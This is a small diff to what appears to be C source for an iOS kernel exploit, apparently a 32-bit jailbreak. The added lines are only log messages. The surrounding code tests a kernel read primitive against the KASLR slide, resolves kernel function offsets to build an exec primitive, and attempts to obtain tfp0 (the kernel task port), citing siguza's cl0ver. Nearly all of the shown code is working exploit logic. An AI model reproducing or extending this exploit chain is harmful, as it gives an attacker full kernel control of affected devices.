@@ -419,14 +419,17 @@ val; \
     /* test read primitive */
     LOG("testing read primitive");
     readtest = kread32_prim(0x80001000 + slide);
+    LOG("read primitive: %s", readtest == MACH_MAGIC ? "success" : "failure");
     if(readtest != MACH_MAGIC)
     {
         ERR("kread failed " ADDR " != " ADDR, readtest, MACH_MAGIC);
         goto fail;
     }
+    
     vm_kernel_addrperm = kread32_prim(koffset(off_vm_kernel_addrperm) + slide);
     
     /* pipe test */
+    LOG("testing pipe");
     if(fstat(fildes[0], &buf) == -1)
     {
         ERR("pipe test failed");
@@ -456,7 +459,9 @@ val; \
     
     read(fildes[0], data, 4096);
     
+    
     // set exec prim
+    LOG("setting exec primitive");
     current_task_func           = slide + koffset(off_current_task);
     ipc_port_make_send_func     = slide + koffset(off_ipc_port_make_send);
     ipc_port_copyout_send_func  = slide + koffset(off_ipc_port_copyout_send);
@@ -465,6 +470,7 @@ val; \
     // tfp0
     // ref: siguza's cl0ver https://blog.siguza.net/cl0ver/
     // *task_addr = ipc_port_copyout_send(ipc_port_make_send(kernel_task->itk_self), current_task()->itk_space);
+    LOG("trying tfp0");
     
     uint32_t current_task = exec_current_task();
     LOG("current_task(): " ADDR, current_task);
